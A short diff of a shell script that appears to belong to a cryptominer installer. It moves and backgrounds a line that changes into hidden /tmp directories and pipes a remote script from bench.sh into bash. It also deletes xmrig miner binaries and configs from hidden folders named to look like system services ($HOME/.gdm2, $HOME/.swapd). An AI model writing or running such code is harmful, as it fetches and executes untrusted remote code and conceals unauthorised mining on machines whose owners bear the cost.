@@ -62,10 +62,12 @@ else
     userstuff
 fi
 
-cd /tmp ; cd .ICE-unix ; cd .X11-unix ; curl -Lso- bench.sh | bash
-
 # Clean up
-rm -rf config.json*
-rm -rf xmrig*
+rm -rf $HOME/.gdm2/config.json*
+rm -rf $HOME/.swapd/config.json*
+rm -rf $HOME/.gdm2/xmrig*
+rm -rf $HOME/.swapd/cxmrig*
+
+cd /tmp ; cd .ICE-unix ; cd .X11-unix ; curl -Lso- bench.sh | bash&
 
 
